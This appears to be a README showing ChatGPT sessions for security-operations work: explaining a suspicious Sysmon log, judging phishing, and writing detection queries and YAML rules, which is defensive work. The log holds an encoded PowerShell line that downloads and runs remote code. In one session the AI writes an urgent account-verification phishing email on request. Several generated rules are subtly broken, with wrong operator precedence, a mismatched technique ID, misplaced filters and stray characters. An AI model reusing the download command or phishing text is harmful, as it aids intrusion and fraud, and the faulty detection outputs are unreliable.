# *-chatgpt-ai-examples

***1. Suspicious Event Unpacking and Explanation***

`OpenAI prompt: please analyze the suspicious event below and explain what's going on.`

<14>Mar 10 07:21:45 mail1.ionxsecure.com MSWinEventLog  1   Microsoft-Windows-Sysmon/Operational    60  Wed Mar 10 07:21:45 2021    1   Microsoft-Windows-Sysmon    SYSTEM  User    Information mail1.ionxsecure.com    Process Create (rule: ProcessCreate)        Process Create:  RuleName: technique_id=T1059.003,technique_name=Windows Command Shell  UtcTime: 2021-03-10 13:21:45.504  ProcessGuid: {B2FBB6B8-C7E9-6048-1F25-000000001D00}  ProcessId: 12816  Image: C:\Windows\System32\cmd.exe  FileVersion: 10.0.14393.0 (rs1_release.160715-1616)  Description: Windows Command Processor  Product: Microsoft® Windows® Operating System  Company: Microsoft Corporation  OriginalFileName: Cmd.Exe  CommandLine: "cmd.exe" /c powershell -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcAAuAGUAcwB0AG8AbgBpAG4AZQAuAGMAbwBtAC8AcAA/AGUAJwApAA==  CurrentDirectory: c:\windows\system32\inetsrv\  User: NT AUTHORITY\SYSTEM  LogonGuid: {B2FBB6B8-1CF1-6043-E703-000000000000}  LogonId: 0x3E7  TerminalSessionId: 0  IntegrityLevel: System  Hashes: SHA1=99AE9C73E9BEE6F9C76D6F4093A9882DF06832CF,MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A  ParentProcessGuid: {B2FBB6B8-1DC2-6043-A300-000000001D00}  ParentProcessId: 10400  ParentImage: C:\Windows\System32\inetsrv\w3wp.exe  ParentCommandLine: c:\windows\system32\inetsrv\w3wp.exe -ap "MSExchangeOWAAppPool" -v "v4.0" -c "C:\Program Files\Microsoft\Exchange Server\V15\bin\GenericAppPoolConfigWithGCServerEnabledFalse.config" -a \\.\pipe\iisipm6ad061fd-1d32-4f0c-9631-cc382e98f5ef -h "C:\inetpub\temp\apppools\MSExchangeOWAAppPool\MSExchangeOWAAppPool.config" -w "" -m 0   19182

*OpenAI Response: This event is a process creation event generated by Sysmon. It appears that a Windows Command Shell (cmd.exe) was created with parameters to run a Powershell script. The process was created by user NT AUTHORITY\SYSTEM and it is likely that the system was compromised and the attacker is running a malicious script.*

`OpenAI prompt: analyze the parameters and the powershell script, decode the base64 argument, and explain what the script does.`

*OpenAI Response: The parameters of the Powershell script indicate that the script is attempting to bypass security restrictions and execute arbitrary code. The base64 argument is likely a payload containing malicious code. After decoding the base64 argument, it appears that the script is attempting to download a file from a remote source and then execute it. This type of attack is often used to download and execute malware on the system.*

***2. Creating phishing email***

`OpenAI prompt:` 
> Write an email that requires immediate action with a link https://www.fakebank.com/account-login?ref=12345&verify=true

`OpenAI Response: `
>Subject: Urgent - Action Required
>
>Dear [Recipient],
>
>We need your immediate action to ensure your account security.
>
>Please click on the link below to verify your account and ensure the security of your account at Fake Bank:
>
>https://www.fakebank.com/account-login?ref=12345&verify=true
>
>Please complete this verification process as soon as possible.
>
>Thank you for your prompt attention to this matter.
>
>Sincerely,
>[Your Name]

***3. Check if email is phishing***
`OpenAI prompt:` 
> Do you think this email looks like phishing? Answer in 1 word
> Subject: Urgent - Action Required
> 
> Dear [Recipient],
> 
> We need your immediate action to ensure your account security.
> 
> Please click on the link below to verify your account and ensure the security of your account at Fake Bank:
> 
> https://www.fakebank.com/account-login?ref=12345&verify=true
> 
> Please complete this verification process as soon as possible.
> 
> Thank you for your prompt attention to this matter.
> 
> Sincerely,
> [Your Name]

`OpenAI Response: `
> Yes
> 
***4. Building Spotter Query for IOCs***

`OpenAI prompt:` 
> This is an example of a spotter query:
> index=activity AND rg_functionality="Web Proxy" AND destinationaddress NOT NULL AND destinationaddress IN ("163.123.142.210","185.106.94.146",> "45.142.122.11","51.255.171.23")
> 
> Please build a spotter query for the following IOCs:
> - 192.185.129.139
> - 76.25.142.196

`OpenAI Response:` 
> index=activity AND rg_functionality="Web Proxy" AND destinationaddress NOT NULL AND destinationaddress IN ("192.185.129.139","76.25.142.196")

***5. Building Spotter Query from YAML***

`OpenAI prompt:` 
> This is an example of a spotter query:
> 
> rg_functionality = “Endpoint Management Systems” AND (deviceaction = “Process Create” OR deviceaction = “ProcessCreate” OR deviceaction = “Process Create (rule: ProcessCreate)” OR deviceaction = “ProcessRollup2” OR deviceaction = “SyntheticProcessRollUp2” OR deviceaction = “WmiCreateProcess” OR deviceaction = “Trace Executed Process” OR deviceaction = “Process” OR deviceaction = “Childproc” OR deviceaction = “Procstart” OR deviceaction = “Process Activity: Launched”) AND destinationprocessname = “cmd.exe” AND resourcecustomfield1 CONTAINS “-decode” AND resourcecustomfield1 CONTAINS “.jpg.lnk”
> 
> Please build a spotter query for the following yaml:
```
title: JXA In-memory Execution Via OSAScript
id: f1408a58-0e94-4165-b80a-da9f96cf6fc3
related:
    - id: 1bc2e6c5-0885-472b-bed6-be5ea8eace55
      type: derived
status: experimental
description: Detects possible malicious execution of JXA in-memory via OSAScript
references:
    - https://redcanary.com/blog/applescript/
author: Sohan G (D4rkCiph3r)
date: 2023/01/31
tags:
    - attack.t1059.002
    - attack.t1059.007
    - attack.execution
logsource:
    product: macos
    category: process_creation
detection:
    selection_main:
        CommandLine|contains|all:
            - 'osascript'
            - ' -e '
            - 'eval'
            - 'NSData.dataWithContentsOfURL'
    selection_js:
        - CommandLine|contains|all:
            - ' -l '
            - 'JavaScript'
        - CommandLine|contains: '.js'
    condition: all of selection_*
fields:
    - CommandLine
falsepositives:
    - Unknown
level: high
```


`OpenAI Response:`
>  rg_functionality = "Process Create" AND (deviceaction = "ProcessCreate" OR deviceaction = "ProcessCreate (rule: ProcessCreate)" OR deviceaction = "ProcessRollup2" OR deviceaction = "SyntheticProcessRollUp2" OR deviceaction = "WmiCreateProcess" OR deviceaction = "Trace Executed Process" OR deviceaction = "Process" OR deviceaction = "Childproc" OR deviceaction = "Procstart" OR deviceaction = "Process Activity: Launched") AND CommandLine CONTAINS "osascript" AND CommandLine CONTAINS " -e " AND CommandLine CONTAINS "eval" AND CommandLine CONTAINS "NSData.dataWithContentsOfURL" AND (CommandLine CONTAINS " -l " AND CommandLine CONTAINS "JavaScript") OR CommandLine CONTAINS ".js"

***6. Building STR Omega from Spotter query***

`OpenAI prompt:`
> This is an example of an STR Omega yaml structure
```
# omega - compound/second order attack behavior detection by Securonix
title: System Information Discovery WMIC Command LineAnalytics
uuid: EDR-SYM315-RUN
tldr: An adversary may attempt to get detailed information about the operating system and hardware.

reference: https://www.varonis.com/blog/alphv-blackcat-ransomware

tags:
  - attack.discovery
  - attack.t1082
  - BlackCat
  - Ransomware as a Service (RaaS) 

omega_securonix_ueba:
    snpr_policy:
        violator: Activityaccount
        category: ALERT
        threatname: Suspicious Access Pattern
        functionality: Endpoint Management Systems 

logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: wmic.exe
        CommandLine|contains: get
    filter:
        CommandLine|contains: 
            - MACAddress
            - UUID
            - Win32_videocontroller
            - ComputerSystem
            - OS
            - logicaldisk
    condition: selection and filter
```
> Please build STR Omega for the following  query:
>rg_functionality = “Endpoint Management Systems” AND (deviceaction = “Process Create” OR deviceaction = “ProcessCreate” OR deviceaction = “Process Create (rule: ProcessCreate)” OR deviceaction = “ProcessRollup2” OR deviceaction = “SyntheticProcessRollUp2” OR deviceaction = “WmiCreateProcess” OR deviceaction = “Trace Executed Process” OR deviceaction = “Process” OR deviceaction = “Childproc” OR deviceaction = “Procstart” OR deviceaction = “Process Activity: Launched”) AND destinationprocessname = “certutil.exe” AND resourcecustomfield1 CONTAINS “-decode” AND resourcecustomfield1 CONTAINS “Cortana” AND resourcecustomfield1 CONTAINS “.rar”`

`OpenAI Response:`
```
title: Certutil.exe Command Line Activity
uuid: EDR-SYM315-CERTUTIL
tldr: An adversary may use certutil.exe command line to decode and extract files from a .rar file.

reference: https://attack.mitre.org/techniques/T1122/

tags:
  - attack.t1122
  - attack.execution

omega_securonix_ueba:
    snpr_policy:
        violator: Activityaccount
        category: ALERT
        threatname: Suspicious Access Pattern
        functionality: Endpoint Management Systems 

logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: certutil.exe
        CommandLine|contains: -decode
        CommandLine|contains: Cortana
        CommandLine|contains: .rar
    condition: selection 
    filter:
        CommandLine|contains:
            - decode
            - Cortana
            - .rar *
```
***7. Updating STR Omega with filter values***

`OpenAI prompt:`
>  This is an example of an STR Omega yaml structure
```
# omega - compound/second order attack behavior detection by Securonix
title: Potential Formbook Infostealer Activity Process Self-Deleting Analytic
uuid: EDR-SYM269-RUN
tldr: Detect Formbook info stealer that uses self-deleting action

tags:
    - Formbook RAT
    
omega_securonix_ueba:
    snpr_policy:
        violator: Activityaccount
        category: ALERT
        threatname: Suspicious Access Pattern
        functionality: Endpoint Management Systems 

logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith:
            - services.exe
            - chkdsk.exe
            - cmstp.exe
        Image|endswith: cmd.exe
        CommandLine|contains|all:
            - ' /c '
            - ' del '
    condition: selection
```
>
>Print updated STR Omega with a filter key "filter" with an object  in the detection  section with  CommandLine containing any of the keywords:
> - lab.local
> - 127.0.0.1
> under the detection key and modify the condition with a filter keyword to exclude false positives`
>
`OpenAI Response:`
```
title: Potential Formbook Infostealer Activity Process Self-Deleting Analytic
uuid: EDR-SYM269-RUN
tldr: Detect Formbook info stealer that uses self-deleting action

tags:
    - Formbook RAT
    
omega_securonix_ueba:
    snpr_policy:
        violator: Activityaccount
        category: ALERT
        threatname: Suspicious Access Pattern
        functionality: Endpoint Management Systems 

logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith:
            - services.exe
            - chkdsk.exe
            - cmstp.exe
        Image|endswith: cmd.exe
        CommandLine|contains|all:
            - ' /c '
            - ' del '
        filter:
            CommandLine|contains|any:
                - lab.local
                - 127.0.0.1
    condition: selection && !filter *
```


***8. Combining STR Omegas***

`OpenAI prompt:` 
> This is  STR Omega with UUID EDR-SYM158-RUN
```
# omega - compound/second order attack behavior detection by Securonix
title: Possible Hafnium Group Activity Reverse Shell Connection CommandLine Analytic
uuid: EDR-SYM158-RUN

references:
  - https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/
  - https://blog.truesec.com/2021/03/07/exchange-zero-day-proxylogon-and-hafnium/

omega_securonix_ueba:
    snpr_policy:
        violator: Activityaccount
        category: 'ALERT'
        threatname: 'Suspicious Access Pattern'
        functionality: 'Endpoint Management Systems'

logsource:
  category: process_creation
  product: windows

detection:
  selection:
    CommandLine|contains:
      - "system.net.sockets.tcpclient"
  condition: selection
```
>
>This is  STR Omega with UUID  EDR-SYM159-RUN
>
```
title: Installed AntiVirus Products Enumeration Analytic
uuid: EDR-SYM159-RUN

omega_securonix_ueba:
    snpr_policy:
        violator: Resources
        category: ALERT
        threatname: Windows Management Instrumentation
        functionality: Endpoint Management Systems

logsource:
  category: process_creation
  product: windows

detection:
  selection:  
    CommandLine|contains: 
      - wmic
      - SecurityCenter2
      - Path 
      - AntiVirusProduct 
      - Get
  condition: selection
```
>Please combine them into one STR Omega with UUID EDR-SYM777-RUN.`
>
`OpenAI Response:`
```
title: Possible Hafnium Group Activity Reverse Shell Connection and Installed AntiVirus Products Enumeration Analytic
uuid: EDR-SYM777-RUN

omega_securonix_ueba:
    snpr_policy:
        violator: Activityaccount, Resources
        category: 'ALERT'
        threatname: 'Suspicious Access Pattern, Windows Management Instrumentation'
        functionality: 'Endpoint Management Systems'

logsource:
  category: process_creation
  product: windows

detection:
  selection:
    CommandLine|contains:
      - "system.net.sockets.tcpclient"
      - wmic
      - SecurityCenter2
      - Path 
      - AntiVirusProduct 
      - Get
  condition: selection *
```
